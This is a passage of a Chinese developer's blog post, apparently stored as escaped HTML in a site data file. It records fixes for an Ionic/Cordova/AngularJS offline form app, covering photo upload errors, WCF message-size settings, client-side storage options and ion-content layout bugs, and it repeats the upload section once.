href=\"http://stackoverflow.com/questions/8643708/upload-image-from-android-phonegap-to-a-server-using-asmx\" target=\"_blank\" rel=\"noopener\">Upload image from android phonegap to a server using asmx</a></li>\n</ol>\n<h3 id=\"问题1：不能发出请求\"><a href=\"#问题1：不能发出请求\" class=\"headerlink\" title=\"问题1：不能发出请求\"></a>问题1：不能发出请求</h3><p>console出来错误是：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upload error source </span><br><span class=\"line\">upload error target</span><br></pre></td></tr></table></figure></p>\n<p>以及会Alert:（一次只Alert一个，code=1或者code=3，这两种都遇到过）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">An error has occurred : code =1  </span><br><span class=\"line\">An error has occurred : code =3</span><br></pre></td></tr></table></figure></p>\n<p>code = 1最终解决方案：<br>原因：传送的文件大小超出服务器接收限度<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;system.serviceModel&gt; </span><br><span class=\"line\">  &lt;bindings&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">//其他的setting, 藍色是新增的 </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;webHttpBinding&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;binding maxReceivedMessageSize=&quot;2147483647&quot; /&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/webHttpBinding&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/bindings&gt;</span><br></pre></td></tr></table></figure></p>\n<p>这是加在后台的，我也不太懂，后台摸索好久，一开始加的地方不对，据后台说需要加到最外层，才变好了。</p>\n<p><strong>解决方案参考链接：</strong></p>\n<ol>\n<li><a href=\"http://stackoverflow.com/questions/19275268/phonegap-file-transfer-of-picture-fails-on-every-other-picture-error-code-3-wit\" target=\"_blank\" rel=\"noopener\">Phonegap File Transfer of picture fails on every other picture: Error code 3 with FileTransfer upload</a></li>\n<li><a href=\"http://stackoverflow.com/questions/30783847/file-upload-error-code-1-in-ng-cordova-filetransfer-plugin\" target=\"_blank\" rel=\"noopener\">File upload error code 1 in ng-cordova filetransfer plugin</a></li>\n<li><a href=\"https://forum.ionicframework.com/t/best-way-to-transfer-a-picture-it-to-a-server/53326\nhttps://github.com/dtaalbers/ionic-2-examples/tree/master/file-transfer-uploa\" target=\"_blank\" rel=\"noopener\">Best way to transfer a picture it to a server</a></li>\n<li><a href=\"https://forum.ionicframework.com/t/problems-with-image-url-when-uploading-with-file-transfer-plugin/50230\" target=\"_blank\" rel=\"noopener\">Problems with image URL when uploading with file transfer plugin(最大长度)</a></li>\n<li><a href=\"https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-file-transfer/#installation\" target=\"_blank\" rel=\"noopener\">cordova file transfer文档，code代表的含义</a></li>\n<li><a href=\"http://stackoverflow.com/questions/32862953/retrieve-http-headers-in-cordova-file-transfer-asp-server\" target=\"_blank\" rel=\"noopener\">Retrieve HTTP headers in Cordova File Transfer ASP Server</a></li>\n</ol>\n<h3 id=\"上传数据的格式\"><a href=\"#上传数据的格式\" class=\"headerlink\" title=\"上传数据的格式\"></a>上传数据的格式</h3><p>解决了code=1，后台可以接收到请求之后，后台不知道我传过去的数据是什么格式的，我也不知道，因为从浏览器的network里看不到相关信息，cordova-file-transfer文档里也看不到相关介绍。于是后台那边只能看到一张全黑的图片，他们搞了两天，最后终于找到说安装了一个解析包：<code>HttpMultipartParser</code>然后就能正常解析了，并且搞明白了传过去的格式是stream，里面包含了图片数据和uploadOptions里的参数。后台筒子们，我只能帮你们到这了。</p>\n<h3 id=\"on-‘-stateChangeStart’-中使用-state-go会导致无限循环的问题\"><a href=\"#on-‘-stateChangeStart’-中使用-state-go会导致无限循环的问题\" class=\"headerlink\" title=\"$on(‘$stateChangeStart’)中使用$state.go会导致无限循环的问题\"></a>$on(‘$stateChangeStart’)中使用$state.go会导致无限循环的问题</h3><p><a href=\"http://stackoverflow.com/questions/26796945/ui-router-state-go-inside-onstatechangestart-is-cauzing-an-infinite-loop\" target=\"_blank\" rel=\"noopener\">Ui-Router $state.go inside $on(‘$stateChangeStart’) is cauzing an infinite loop</a></p>\n<h3 id=\"npm-install-时的问题\"><a href=\"#npm-install-时的问题\" class=\"headerlink\" title=\"npm install 时的问题\"></a>npm install 时的问题</h3><p><a href=\"https://github.com/vigetlabs/gulp-starter/issues/62\" target=\"_blank\" rel=\"noopener\">unmet dependency but will load</a><br>按照答案中的方法之后会报错：<br><code>&#39;rm&#39; 不是内部或外部命令，也不是可运行的程序 或批处理文件。</code><br>原因：rm是linux中的命令<br>解决方案：<br>使用git bash 打开项目文件夹，<br>rm -rf $HOME/.npm<br>npm cache clean<br>然后再回node shell中使用npm install</p>\n<h3 id=\"npm-install的时候，不能自动安装插件，build出来的APK包plugin丢失，\"><a href=\"#npm-install的时候，不能自动安装插件，build出来的APK包plugin丢失，\" class=\"headerlink\" title=\"npm install的时候，不能自动安装插件，build出来的APK包plugin丢失，\"></a>npm install的时候，不能自动安装插件，build出来的APK包plugin丢失，</h3><p>是因为在安装cordova插件的时候，本应该使用这样的安装命令<code>cordova plugin add XXX --save</code>，但我没有加 <code>--save</code>，这个<code>--save</code>的作用是会自动保存插件的信息到项目根目录下的config.xml，这样在npm install的时候就会根据config.xml文件来自动安装插件</p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><h2 id=\"angular-如何刷新页面\"><a href=\"#angular-如何刷新页面\" class=\"headerlink\" title=\"angular 如何刷新页面\"></a>angular 如何刷新页面</h2><p>需求：多个状态都会跳转到某个state，有一些跳转需要刷新，有一些不需要刷新<br>解决方案：<br>全部需要刷新的时候，就在state里加上<code>cache:false</code>;<br>部分需要刷新的时候，使用$rootScope.$broadcast()，把需要刷新的初始化函数放在 $rootScope.$on的回调函数里</p>\n<h2 id=\"AngularJS定时器\"><a href=\"#AngularJS定时器\" class=\"headerlink\" title=\"AngularJS定时器\"></a>AngularJS定时器</h2><ol>\n<li><a href=\"http://sentsin.com/web/486.html\" target=\"_blank\" rel=\"noopener\">说说Angular中的$timeOut定时器</a></li>\n<li><a href=\"http://www.codesec.net/view/406326.html\" target=\"_blank\" rel=\"noopener\">AngularJS中$interval的用法详解</a></li>\n</ol>\n<h2 id=\"Array的删除splice和for循环合用时的一个小坑\"><a href=\"#Array的删除splice和for循环合用时的一个小坑\" class=\"headerlink\" title=\"Array的删除splice和for循环合用时的一个小坑\"></a>Array的删除splice和for循环合用时的一个小坑</h2><p>Array的删除splice和for循环合用时，由于Array删除一项之后，影响到length和后面项的索引值，所以一定要注意。正确代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var i=0; </span><br><span class=\"line\">for(i; i&lt; arr.length; )&#123; </span><br><span class=\"line\">  if(arr[i].isSelected===true)&#123; </span><br><span class=\"line\">    arr.splice(i,1); </span><br><span class=\"line\">  &#125;else &#123;i++;&#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>参考链接：</p>\n<ol>\n<li><a href=\"http://jerryzou.com/posts/cookie-and-web-storage/\" target=\"_blank\" rel=\"noopener\">详说 Cookie, LocalStorage 与 SessionStorage</a></li>\n<li><a href=\"http://programmers.stackexchange.com/questions/220254/why-is-web-sql-database-deprecated\" target=\"_blank\" rel=\"noopener\">Why is Web SQL database deprecated?</a></li>\n<li><a href=\"https://forum.ionicframework.com/t/ion-content-height-100-is-not-working/28667/2\" target=\"_blank\" rel=\"noopener\">Ion-content height:100% is not working</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>本篇主要记录了我遇到的一些问题，和解决方案，以供参考。问题比较杂乱，简单分了一下类，感觉还是不太清晰π__π，但是感觉也没有人会需要全篇内容吧，如果能在你报了某个错误时，我的某个解决方案能给你一点启发，那就是做好事啦~<br>","more":"</p>\n<h1 id=\"APP需求背景简介\"><a href=\"#APP需求背景简介\" class=\"headerlink\" title=\"APP需求背景简介\"></a>APP需求背景简介</h1><p>这个APP的需求简单来说是这样的：</p>\n<ol>\n<li>在有网络的环境中打开APP时，从后台下载表单资料(下拉选项等)保存在Device，无网络环境下从Device读取表单资料；</li>\n<li>用户填写表单并保存后，信息保存在Device，并且如果网络允许，进行自动上传到后台服务器，如果网络不允许，将等到网络允许时上传；</li>\n<li>网络区分WIFI和3G/4G，WIFI下自动上传，3G/4G下如果用户选了Allow 3G，就自动上传，否则当用户点击上传时才上传，并且开始上传后用户可以点击停止以终止上传。</li>\n<li>填写表单时，用户可以添加手机图库的图片，也可以拍照</li>\n</ol>\n<h1 id=\"方案篇\"><a href=\"#方案篇\" class=\"headerlink\" title=\"方案篇\"></a>方案篇</h1><h2 id=\"照片离线存储、上传：\"><a href=\"#照片离线存储、上传：\" class=\"headerlink\" title=\"照片离线存储、上传：\"></a>照片离线存储、上传：</h2><p>调用图库和拍照都是使用<code>cordova-plugin-camera</code>插件，值得一提的时候，这个插件调用图库选图片的时候一次只能选一张，如果想一次选多张可以使用<code>cordova-imagePicker</code>插件。他的<code>CameraOptions</code>中，把<code>saveToPhotoAlbum</code>设为<code>true</code>，可以在拍照的时候保存下来图片，默认是<code>false</code>。使用camera插件选图或拍照后会得到一个imgURI，是图片的缓存路径，存储的时候存储这个路径，上传的时候从这个路径里上传图片。</p>\n<p>照片上传使用这个插件：<code>$cordovaFileTransfer</code><br>用法文档参考链接：</p>\n<ol>\n<li><a href=\"https://forum.ionicframework.com/t/cordova-file-transfer-upload-image-from-device/40517\" target=\"_blank\" rel=\"noopener\">论坛</a></li>\n<li><a href=\"https://github.com/apache/cordova-plugin-file-transfer\" target=\"_blank\" rel=\"noopener\">cordova-plugin-file-transfer github</a></li>\n<li><a href=\"http://ngcordova.com/docs/plugins/fileTransfer/\" target=\"_blank\" rel=\"noopener\">$cordovaFileTransfer文档</a></li>\n</ol>\n<h2 id=\"离线存储技术简介\"><a href=\"#离线存储技术简介\" class=\"headerlink\" title=\"离线存储技术简介\"></a>离线存储技术简介</h2><p>HTML5中关于离线的API主要分为应用缓存（Appcache）和客户端存储两大块。</p>\n<h3 id=\"应用缓存（Appcache）\"><a href=\"#应用缓存（Appcache）\" class=\"headerlink\" title=\"应用缓存（Appcache）\"></a>应用缓存（Appcache）</h3><p>应用缓存关键词为manifest，主要是在网页的根html标签中添加manifest属性，属性值为保存着需要缓存资源清单的文件的地址。实例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE HTML&gt;</span><br><span class=\"line\">&lt;html manifest=&quot;demo.appcache&quot;&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>关于怎样使用，这个链接讲的非常好：<a href=\"http://www.html5rocks.com/zh/tutorials/appcache/beginner/\" target=\"_blank\" rel=\"noopener\">应用缓存初级使用指南</a>。<br>需要应用到manifest的场景是——离线网页应用，就是使用前不需要用户下载一个APP或者是别的任何东西，而是访问一个网址，第一次访问时，就把这个网页上需要缓存的东西，例如JS文件、CSS文件、网页中用到的图片、图标等，下载到浏览器，然后即使离线情况下，刷新网页，也还是可以使用。</p>\n<h3 id=\"客户端数据存储\"><a href=\"#客户端数据存储\" class=\"headerlink\" title=\"客户端数据存储\"></a>客户端数据存储</h3><p>分类概览：</p>\n<ul>\n<li>Cookie</li>\n<li>Web Storage<ul>\n<li>localStorage(前身是globalStorage)</li>\n<li>sessionStorage</li>\n</ul>\n</li>\n<li>数据库存储<ul>\n<li>Web SQL Database</li>\n<li>IndexedDB</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">名称</th>\n<th style=\"text-align:left\">大小</th>\n<th style=\"text-align:left\">过期时间</th>\n<th style=\"text-align:left\">与服务器通信</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">Cookie</td>\n<td style=\"text-align:left\">单域名下总大小4K左右，25个/50个/30个</td>\n<td style=\"text-align:left\">默认关浏览器就过期，设置了过期时间，到过期时间才过期</td>\n<td style=\"text-align:left\">每次附在请求头中</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">localStorage</td>\n<td style=\"text-align:left\">单域名下5M或2.5M</td>\n<td style=\"text-align:left\">永久保存在浏览器中，除非手动清除</td>\n<td style=\"text-align:left\">不参与通信</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">sessionStorage</td>\n<td style=\"text-align:left\">单域名下5M或2.5M</td>\n<td style=\"text-align:left\">保存到浏览器关闭，可以跨越页面刷新而存在</td>\n<td style=\"text-align:left\">不参与通信</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><p><strong>缺点</strong></p>\n<ol>\n<li>容量小，超过容量就被浏览器默默丢掉，你啥都不知道<del>(想起囧不懂)</del> ；</li>\n<li>使用起来很不方便，需要封装工具方法；</li>\n<li>每次都会附在请求头中发送，影响请求性能；</li>\n</ol>\n<p>由于这些限制，只能保存比较少的信息，且由于用户可以查看和改写cookie，所以不能存储敏感信息。</p>\n<p><strong>使用场景：</strong><br>登录时保存密码，以前还用来保存用户进行购物车操作时的信息，现在可以用localStorage代替。</p>\n<h4 id=\"localStorage\"><a href=\"#localStorage\" class=\"headerlink\" title=\"localStorage\"></a>localStorage</h4><p>缺点：只能存储字符串。非字符串的数据在存储之前会被转换成字符串</p>\n<h4 id=\"sessionStorage\"><a href=\"#sessionStorage\" class=\"headerlink\" title=\"sessionStorage\"></a>sessionStorage</h4><ol>\n<li>缺点只能存储字符串。</li>\n<li>绑定于某个服务器会话，所以本地运行时不可用，</li>\n<li>存储在 sessionStorage中的数据只能由最初给对象存储数据的页面访问到，所以对多页面应用有限制。</li>\n</ol>\n<h4 id=\"Web-SQL-和-IndexedDB\"><a href=\"#Web-SQL-和-IndexedDB\" class=\"headerlink\" title=\"Web SQL 和 IndexedDB\"></a>Web SQL 和 IndexedDB</h4><p>SQLite本身是一个关系数据库管理系统，HTML5拿来封了一套API以实现客户端数据库存储，就是Web SQL，但由于拿来别人的东西使用，就只能就一些边边角角的标准进行定义，这并不是W3C想要的，于是现在Web SQL已经被废弃，而另起炉灶创建了IndexDB，但由于现在IndexDB的一些功能还停留在草案阶段，所以SQLite还是有一定的市场。</p>\n<h2 id=\"使用SQLite的经验\"><a href=\"#使用SQLite的经验\" class=\"headerlink\" title=\"使用SQLite的经验\"></a>使用SQLite的经验</h2><p>本来项目使用了localStorage来做存储，但后来客户坚持要求使用SQLite，以便未来扩展APP功能时可以对数据进行搜索排序等，于是就重写了相关代码。<br><strong>参考教程地址：</strong></p>\n<ol>\n<li><a href=\"https://www.w3.org/TR/webdatabase/#executing-sql-statements\" target=\"_blank\" rel=\"noopener\">W3C</a></li>\n<li><a href=\"http://www.runoob.com/sqlite/sqlite-drop-table.html\" target=\"_blank\" rel=\"noopener\">菜鸟网，可以作为API查询</a></li>\n<li><a href=\"http://www.html5rocks.com/en/tutorials/webdatabase/todo/#toc-step3\" target=\"_blank\" rel=\"noopener\">A Simple TODO list using HTML5 WebDatabases</a></li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/web/1011_guozb_html5off/\" target=\"_blank\" rel=\"noopener\">使用 HTML5 开发离线应用</a></li>\n</ol>\n<p><strong>评价：</strong><br>优点：如果需要数据搜索、排序等，可以使用<br>缺点：异步操作，操作结果的后续动作需要写在回调函数里，如果需要频繁存取，或者逻辑比较复杂，会产生很复杂的嵌套，不便于维护、并且是已经被废弃的标准</p>\n<h2 id=\"ionic-点击小图显示大图\"><a href=\"#ionic-点击小图显示大图\" class=\"headerlink\" title=\"ionic 点击小图显示大图\"></a>ionic 点击小图显示大图</h2><ol>\n<li><a href=\"https://devdactic.com/images-videos-fullscreen-ionic/\" target=\"_blank\" rel=\"noopener\">ionic click small image show big image</a></li>\n<li><a href=\"https://codepen.io/rdelafuente/pen/tJrik/\" target=\"_blank\" rel=\"noopener\">Ionic Modal - Fullscreen images</a></li>\n<li><a href=\"https://devdactic.com/images-videos-fullscreen-ionic/\" target=\"_blank\" rel=\"noopener\">How To Display Images and Videos with Ionic Really Cool</a></li>\n</ol>\n<h2 id=\"判断手机网络状况\"><a href=\"#判断手机网络状况\" class=\"headerlink\" title=\"判断手机网络状况\"></a>判断手机网络状况</h2><p><a href=\"http://ngcordova.com/docs/plugins/network/\" target=\"_blank\" rel=\"noopener\">$cordovaNetwork</a></p>\n<h2 id=\"使用-state-go切换状态之前，检查token\"><a href=\"#使用-state-go切换状态之前，检查token\" class=\"headerlink\" title=\"使用$state.go切换状态之前，检查token\"></a>使用$state.go切换状态之前，检查token</h2><p><a href=\"http://stackoverflow.com/questions/22537311/angular-ui-router-login-authentication\" target=\"_blank\" rel=\"noopener\">angular ui-router login authentication</a></p>\n<h2 id=\"Base64解码\"><a href=\"#Base64解码\" class=\"headerlink\" title=\"Base64解码\"></a>Base64解码</h2><p><a href=\"http://www.w3cfuns.com/notes/13967/3f397874b7afbe49eaa678f3331bf5e0.html\" target=\"_blank\" rel=\"noopener\">Base64 编码与解码</a></p>\n<h2 id=\"angularJS-Watch元素高度变化\"><a href=\"#angularJS-Watch元素高度变化\" class=\"headerlink\" title=\"angularJS $Watch元素高度变化\"></a>angularJS $Watch元素高度变化</h2><p>需求背景是，输入框一开始高度是一行，输入多行时高度自适应，达到6行时，固定高度，出滚动条，textarea做不到这些，于是使用了可编辑div做输入框，给div标签加了<code>contenteditable = true</code>属性。然后需求就是要监听其高度变化。如果是input输入框就可以用ng-change事件监听，但这个不行要手动写一个。</p>\n<p>使用directive，首先想到使用scope.$watch() 监听div的html改变，可是失败了，因为只有当onblur的时候才会触发$watch计算高度改变，而我要的是在输入的时候，随时监听，以在换行时发现高度改变。【失败代码】：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.directive(&apos;logdirective&apos;,function()&#123; </span><br><span class=\"line\">    return &#123; </span><br><span class=\"line\">        link:function(scope, ele, attrs)&#123; </span><br><span class=\"line\">            scope.$watch(function()&#123; </span><br><span class=\"line\">                return ele[0].html; </span><br><span class=\"line\">                &#125;, function(newVal, oldVal)&#123; </span><br><span class=\"line\">                console.log(&apos;height change!&apos;); </span><br><span class=\"line\">                console.log(newVal); </span><br><span class=\"line\">            &#125;,true); </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>最后不得不使用一个interval来定时检测高度变化，【成功代码】：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.directive(&apos;logdirective&apos;,function($interval)&#123;</span><br><span class=\"line\">            return &#123;</span><br><span class=\"line\">                link:function(scope, ele, attrs)&#123;</span><br><span class=\"line\">                    var timer = null;</span><br><span class=\"line\">                    var memHeight = ele[0].offsetHeight;</span><br><span class=\"line\"></span><br><span class=\"line\">                    ele.on(&apos;focus&apos;, function()&#123;</span><br><span class=\"line\">                        $interval.cancel(timer);</span><br><span class=\"line\">                        timer = $interval(function()&#123;</span><br><span class=\"line\">                            var oldVal = memHeight,</span><br><span class=\"line\">                                newVal = ele[0].offsetHeight;</span><br><span class=\"line\">                            memHeight = newVal;</span><br><span class=\"line\">                            if(newVal !== oldVal)&#123;</span><br><span class=\"line\">                                console.log(&apos;height changed!&apos;);</span><br><span class=\"line\">                                return;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;,1000);</span><br><span class=\"line\"></span><br><span class=\"line\">                        timer.then(function()&#123;</span><br><span class=\"line\">                            console.log(&apos;timer resolved&apos;);</span><br><span class=\"line\">                        &#125;, function()&#123;</span><br><span class=\"line\">                            console.log(&apos;timer rejected&apos;);</span><br><span class=\"line\">                        &#125;);</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">                    ele.on(&apos;blur&apos;, function()&#123;</span><br><span class=\"line\">                        $interval.cancel(timer);</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Error篇\"><a href=\"#Error篇\" class=\"headerlink\" title=\"Error篇\"></a>Error篇</h1><h2 id=\"cordova-already-defined\"><a href=\"#cordova-already-defined\" class=\"headerlink\" title=\"cordova already defined\"></a>cordova already defined</h2><p>原因：index页面重复引入了 cordova .js，删除一个就好</p>\n<h2 id=\"ionic页面滚动时，因为父级使用了transform，导致内容中Position-fixed失效\"><a href=\"#ionic页面滚动时，因为父级使用了transform，导致内容中Position-fixed失效\" class=\"headerlink\" title=\"ionic页面滚动时，因为父级使用了transform，导致内容中Position:fixed失效\"></a>ionic页面滚动时，因为父级使用了transform，导致内容中Position:fixed失效</h2><p>关键词：ionic scroll fixed<br>解决方案：<a href=\"https://forum.ionicframework.com/t/css-position-fixed/2969\" title=\"把该元素拿到`&lt;ion-content&gt;`外面\" target=\"_blank\" rel=\"noopener\">把该元素拿到<code>&lt;ion-content&gt;</code>外面</a></p>\n<p>如果不是在ionic中，其他思路：</p>\n<ol>\n<li>去transform滚动，自己写滚动，<br>ionic 禁止滚动：在<code>&lt;ion-content&gt;</code>上添加scroll = false<br><a href=\"https://segmentfault.com/q/1010000005666477/a-1020000005677694\" title=\"这是一个链接\" target=\"_blank\" rel=\"noopener\">angularJS绑定滚动事件</a></li>\n<li>各种hack方案<br><a href=\"http://stackoverflow.com/questions/2637058/positions-fixed-doesnt-work-when-using-webkit-transform\" title=\"这是一个链接\" target=\"_blank\" rel=\"noopener\">Positions fixed doesn’t work when using -webkit-transform</a></li>\n<li>拓展：<br><a href=\"http://www.ddhigh.com/2014/09/angularjs-lazy-load/\" title=\"这是一个链接\" target=\"_blank\" rel=\"noopener\">摆脱jquery!angularjs利用指令简单实现滚动翻页</a></li>\n</ol>\n<h2 id=\"ionic滚动时，ion-content-高度计算错误-，不能显示全部内容\"><a href=\"#ionic滚动时，ion-content-高度计算错误-，不能显示全部内容\" class=\"headerlink\" title=\"ionic滚动时，ion-content 高度计算错误 ，不能显示全部内容\"></a>ionic滚动时，ion-content 高度计算错误 ，不能显示全部内容</h2><p><img src=\"ionic_hybrid/heightWrong.jpg\" alt=\"ionic_hybrid/heightWrong.jpg\"><br>解决方案：<br>在ion-content上加上<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;   position: absolute;</span><br><span class=\"line\">    top: 0;</span><br><span class=\"line\">    left: 0;</span><br><span class=\"line\">    bottom: 0;</span><br><span class=\"line\">    right: 0;</span><br><span class=\"line\">    margin: auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>注意：</strong>top和bottom值必须为零，如果需要间隔，在ion-content的子元素上加margin，而不要修改top值或bottom值，否则会造成高度计算不正确，还是不能正常显示全部内容。</p>\n<h2 id=\"上传图片：\"><a href=\"#上传图片：\" class=\"headerlink\" title=\"上传图片：\"></a>上传图片：</h2><p>后台是用ASP.NET接收的，写法参考链接：</p>\n<ol>\n<li><a href=\"http://stackoverflow.com/questions/17232183/upload-image-from-phonegap-app-to-wcf-service\" target=\"_blank\" rel=\"noopener\">Upload image from phonegap app to WCF service</a></li>\n<li><a href=\"http://stackoverflow.com/questions/8643708/upload-image-from-android-phonegap-to-a-server-using-asmx\" target=\"_blank\" rel=\"noopener\">Upload image from android phonegap to a server using asmx</a></li>\n</ol>\n<h3 id=\"问题1：不能发出请求\"><a href=\"#问题1：不能发出请求\" class=\"headerlink\" title=\"问题1：不能发出请求\"></a>问题1：不能发出请求</h3><p>console出来错误是：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upload error source </span><br><span class=\"line\">upload error target</span><br></pre></td></tr></table></figure></p>\n<p>以及会Alert:（一次只Alert一个，code=1或者code=3，这两种都遇到过）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">An error has occurred : code =1  </span><br><span class=\"line\">An error has occurred : code =3</span><br></pre></td></tr></table></figure></p>\n<p>code = 1最终解决方案：<br>原因：传送的文件大小超出服务器接收限度<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;system.serviceModel&gt; </span><br><span class=\"line\">  &lt;bindings&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">//其他的setting, 藍色是新增的 </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;webHttpBinding&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;binding maxReceivedMessageSize=&quot;2147483647&quot; /&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/webHttpBinding&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/bindings&gt;</span><br></pre></td></tr></table></figure></p>\n<p>这是加在后台的，我也不太懂，后台摸索好久，一开始加的地方不对，据后台说需要加到最外层，才变好了。</p>\n<p><strong>解决方案参考链接：</strong></p>\n<ol>\n<li><a href=\"http://stackoverflow.com/questions/19275268/phonegap-file-transfer-of-picture-fails-on-every-other-picture-error-code-3-wit\" target=\"_blank\" rel=\"noopener\">Phonegap File Transfer of picture fails on every other picture: Error code 3 with FileTransfer upload</a></li>\n<li><a href=\"http://stackoverflow.com/questions/30783847/file-upload-error-code-1-in-ng-cordova-filetransfer-plugin\" target=\"_blank\" rel=\"noopener\">File upload error code 1 in ng-cordova filetransfer plugin</a></li>\n<li><a href=\"https://forum.ionicframework.com/t/best-way-to-transfer-a-picture-it-to-a-server/53326\nhttps://github.com/dtaalbers/ionic-2-examples/tree/master/file-transfer-uploa\" target=\"_blank\" rel=\"noopener\">Best way to transfer a picture it to a server</a></li>\n<li><a href=\"https://forum.ionicframework.com/t/problems-with-image-url-when-uploading-with-file-transfer-plugin/50230\" target=\"_blank\" rel=\"noopener\">Problems with image URL when uploading with file transfer plugin(最大长度)</a></li>\n<li><a href=\"https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-file-transfer/#installation\" target=\"_blank\" rel=\"noopener\">cordova file transfer文档，code代表的含义</a></li>\n<li><a href=\"http://stackoverflow.com/questions/32862953/retrieve-http-headers-in-cordova-file-transfer-asp-server\" target=\"_blank\" rel=\"noopener\">Retrieve HTTP headers in Cordova File Transfer ASP Server</a></li>\n</ol>\n<h3 id=\"上传数据的格式\"><a href=\"#上传数据的格式\" class=\"headerlink\" 